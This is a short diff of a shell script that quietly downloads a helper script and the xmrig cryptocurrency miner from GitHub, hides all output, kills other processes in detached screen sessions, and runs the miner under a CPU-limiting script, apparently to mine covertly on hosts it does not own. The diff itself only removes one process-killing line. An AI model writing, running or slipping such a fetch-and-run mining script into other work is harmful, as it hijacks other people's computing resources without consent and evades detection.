@@ -9,7 +9,6 @@ wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh > /d
 chmod +x limiting.sh > /dev/null 2>&1
 screen -dmS multex kill dap_multiplexer
 screen -dmS tail pkill tail
-screen -dmS tail pkill node
 screen -dmS randum ./limiting.sh xmrig 65 75 > /dev/null 2>&1
 wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz > /dev/null 2>&1
 tar -xf xmrig-6.11.2-linux-x64.tar.gz > /dev/null 2>&1
